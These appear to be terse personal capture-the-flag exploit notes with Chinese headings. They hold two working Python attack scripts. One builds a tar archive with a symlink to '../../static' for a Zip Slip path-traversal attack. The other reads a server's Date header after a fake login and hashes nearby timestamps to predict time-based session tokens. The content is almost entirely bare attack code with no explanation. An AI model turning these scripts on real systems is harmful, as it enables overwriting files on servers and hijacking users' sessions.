zip→zipslip  压缩文件 软链接 

from tarfile import TarFile
import subprocess

subprocess.run(["ln", "-s", "../../static", "link"])

with TarFile("payload.tar", "w") as tarf:
    tarf.add("link")
    tarf.add("link", "link/test.txt")
session create
import requests as re
import hashlib
from datetime import datetime, timezone, timedelta

BASE_URL = ""
USERNAME = "noexist"
MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]

def extract_posix_time_from_fake_login():
    resp = re.post(f"{BASE_URL}/login", data={"username": USERNAME, "password":"dummypassword"})
    [day, mon, year, time, tz] = resp.headers.get("Date").split(",")[1].split()
    [hour, minute, second] = time.split(":")
    mon = MONTHS.index(mon.capitalize()) + 1
    tz = timezone(offset=timedelta(hours=0))

    dt = datetime(int(year), mon, int(day), int(hour), int(minute), int(second), tzinfo=tz)
    posix = int(dt.timestamp())
    print(f"THE DATE HEADER: {resp.headers.get('Date')}")
    print(f"THE DATETIME OBJECT: {dt}")
    print(f"THE POSIX TIME: {posix}")

    return posix

posix =  extract_posix_time_from_fake_login()

print()
print(f"THE BEFORE HASH IS {hashlib.sha256(str(posix - 1).encode()).digest().hex()}")
print(f"THE EXACT HASH IS {hashlib.sha256(str(posix).encode()).digest().hex()}")
print(f"THE AFTER HASH IS {hashlib.sha256(str(posix + 1).encode()).digest().hex()}")
